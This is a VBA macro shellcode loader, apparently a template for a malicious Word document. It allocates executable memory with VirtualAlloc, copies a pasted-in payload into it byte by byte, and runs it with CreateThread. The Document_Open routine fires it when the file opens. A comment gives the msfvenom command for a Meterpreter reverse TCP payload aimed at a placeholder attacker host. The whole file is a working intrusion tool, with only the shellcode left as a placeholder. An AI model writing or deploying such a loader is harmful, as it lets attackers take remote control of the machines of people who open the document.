Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal destAddr As LongPtr, ByRef sourceAddr As Any, ByVal length As Long) As LongPtr

Sub MyMacro()

    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As LongPtr

    
    ' Output Shellcode from the "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER LPORT=443 -f vbapplication EXITFUNC=thread"
    buf = Array(SHELLCODE to be pasted here in brackets)
    ' Allocate memory space
    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    ' Move the shellcode
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter

    ' Execute the shellcode
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub

Sub Document_Open()
    MyMacro
End Sub

'Sub AutoOpen()
'    MyMacro
'End Sub
